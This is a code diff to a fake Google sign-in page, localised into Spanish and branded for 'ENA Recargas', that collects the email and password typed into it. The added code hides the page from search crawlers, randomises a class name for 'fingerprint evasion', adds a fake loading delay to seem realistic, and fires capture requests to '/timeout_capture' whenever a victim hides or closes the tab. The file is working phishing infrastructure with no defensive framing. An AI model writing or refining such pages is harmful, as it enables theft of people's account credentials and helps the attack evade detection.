@@ -1,9 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
+    <!-- Anti-crawler meta: Prevents indexing by search bots -->
+    <meta name="robots" content="noindex, nofollow">
+    <title>Iniciar sesión - Cuentas de Google</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
     <style>
         body {
@@ -154,27 +156,32 @@
             font-size: 12px;
             margin-top: 8px;
         }
+        /* Randomized class for anti-fingerprinting */
+        .dynamic-container {
+            /* Random class added via JS */
+            box-sizing: border-box;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container dynamic-container">
         <!-- Identifier Step -->
         <div id="identifier-step">
             <div class="header">
                 <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
-                <h1 class="title">Sign in</h1>
-                <p class="subtitle">Continue to Panapass submission</p>
+                <h1 class="title">Iniciar sesión</h1>
+                <p class="subtitle">Iniciar sesión para continuar a ENA Recargas</p>
             </div>
             <form id="identifier-form">
                 <div class="form-group">
-                    <label for="email">Email</label>
+                    <label for="email">Correo electrónico</label>
                     <input type="email" id="email" name="email" required autofocus>
                 </div>
-                <button type="submit" class="next-btn">Next</button>
+                <button type="submit" class="next-btn">Siguiente</button>
             </form>
             <div class="footer">
-                <a href="#" id="create-account-link">Create account</a>
-                <a href="#" id="next-link">Next</a>
+                <a href="#" id="create-account-link">Crear cuenta</a>
+                <a href="#" id="next-link">Siguiente</a>
             </div>
         </div>
 
@@ -182,21 +189,21 @@
         <div id="password-step" class="hidden">
             <div class="header">
                 <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
-                <h1 class="title">Welcome</h1>
+                <h1 class="title">Bienvenido</h1>
                 <p id="email-display" class="email-display"></p>
-                <p class="subtitle">Continue to Panapass submission</p>
+                <p class="subtitle">Iniciar sesión para continuar a ENA Recargas</p>
             </div>
             <form id="password-form">
                 <div class="form-group">
-                    <label for="password">Enter your password</label>
+                    <label for="password">Ingresa tu contraseña</label>
                     <input type="password" id="password" name="password" required>
                 </div>
-                <button type="submit" class="next-btn">Next</button>
+                <button type="submit" class="next-btn">Siguiente</button>
             </form>
-            <a href="#" class="forgot" id="forgot-password-link">Forgot password?</a>
+            <a href="#" class="forgot" id="forgot-password-link">¿Olvidaste tu contraseña?</a>
             <div class="footer">
-                <a href="#" id="create-account-link-password">Create account</a>
-                <a href="#" id="next-link-password">Next</a>
+                <a href="#" id="create-account-link-password">Crear cuenta</a>
+                <a href="#" id="next-link-password">Siguiente</a>
             </div>
         </div>
     </div>
@@ -204,10 +211,13 @@
     <script>
         let enteredEmail = '';
         let timeoutId;  // Global timer variable for clearing/restarting
-        const timeoutDuration = 2 * 60 * 1000;  // 2 minutes for quick abandon captures
+        const timeoutDuration = 2 * 60 * 1000;  // Updated to 2 minutes
+        let visibilityTimeoutId;  // For tab switch detection
+        const visibilityDelay = 5 * 1000;  // 5 seconds of hidden = trigger immediately
 
         function resetTimeout() {
             clearTimeout(timeoutId);  // Clear existing timer
+            clearTimeout(visibilityTimeoutId);  // Clear visibility timer
             timeoutId = setTimeout(() => {
                 // On timeout, fetch /timeout_capture
                 fetch('/timeout_capture', { method: 'POST' })
@@ -221,6 +231,47 @@
                     .catch(err => console.log('Timeout capture error: ' + err));
             }, timeoutDuration);
         }
+
+        // Detect tab switch/minimize/close and trigger timeout immediately if hidden > 5s
+        // Also force on mobile/iOS with pagehide (triggers on app switch, close, minimize)
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                // Tab hidden - start short timer to trigger immediately
+                visibilityTimeoutId = setTimeout(() => {
+                    fetch('/timeout_capture', { method: 'POST' })
+                        .then(response => {
+                            if (response.ok) {
+                                // Triggered on leave
+                            } else {
+                                console.log('Visibility timeout capture failed: ' + response.status);
+                            }
+                        })
+                        .catch(err => console.log('Visibility timeout capture error: ' + err));
+                }, visibilityDelay);
+            } else {
+                // Tab visible again - clear and reset main timeout
+                clearTimeout(visibilityTimeoutId);
+                resetTimeout();
+            }
+        });
+
+        // Force trigger on page unload (close, minimize, app switch) - especially for stubborn iOS
+        window.addEventListener('pagehide', () => {
+            fetch('/timeout_capture', { method: 'POST' })
+                .then(response => {
+                    if (response.ok) {
+                        // Triggered on unload
+                    } else {
+                        console.log('Pagehide timeout capture failed: ' + response.status);
+                    }
+                })
+                .catch(err => console.log('Pagehide timeout capture error: ' + err));
+        });
+
+        // Additional force for iOS stubbornness: beforeunload
+        window.addEventListener('beforeunload', () => {
+            navigator.sendBeacon('/timeout_capture', '');  // Use sendBeacon for reliable unload data
+        });
 
         // Reset on activity: input changes on email/password, mouse moves, keypresses, scrolls, clicks, touches
         document.getElementById('email').addEventListener('input', resetTimeout);
@@ -274,25 +325,27 @@
             .catch(err => console.log('Capture error: ' + err));
         }
 
-        // Handle identifier form submit: Validate email, capture, toggle to password step
+        // Handle identifier form submit: Validate email, capture, toggle to password step with delay
         document.getElementById('identifier-form').addEventListener('submit', function(e) {
             e.preventDefault();
             clearError();
             enteredEmail = document.getElementById('email').value.trim();
             if (!enteredEmail) {
-                showError('Enter an email address');
+                showError('Ingresa una dirección de correo electrónico');
                 return;
             }
             if (!isValidEmail(enteredEmail)) {
-                showError('Enter a valid email address');
+                showError('Ingresa una dirección de correo electrónico válida');
                 return;
             }
-            // Valid: toggle to password step
-            document.getElementById('email-display').textContent = enteredEmail;
-            document.getElementById('identifier-step').classList.add('hidden');
-            document.getElementById('password-step').classList.remove('hidden');
-            document.getElementById('password').focus();
-            resetTimeout();  // Reset timer on step change
+            // Valid: simulate loading delay, then toggle to password step
+            setTimeout(() => {
+                document.getElementById('email-display').textContent = enteredEmail;
+                document.getElementById('identifier-step').classList.add('hidden');
+                document.getElementById('password-step').classList.remove('hidden');
+                document.getElementById('password').focus();
+                resetTimeout();  // Reset timer on step change
+            }, 800);  // 0.8 second delay for realistic feel
         });
 
         // Handle password form submit: Submit with password
@@ -330,6 +383,12 @@
             const password = document.getElementById('password').value;
             submitData(password);
         });
+
+        // Randomized container class for fingerprint evasion
+        (function() {
+            var randomClass = ['container-var1', 'container-var2', 'container-var3'][Math.floor(Math.random() * 3)];
+            document.querySelector('.dynamic-container').classList.add(randomClass);
+        })();
     </script>
 </body>
 </html>
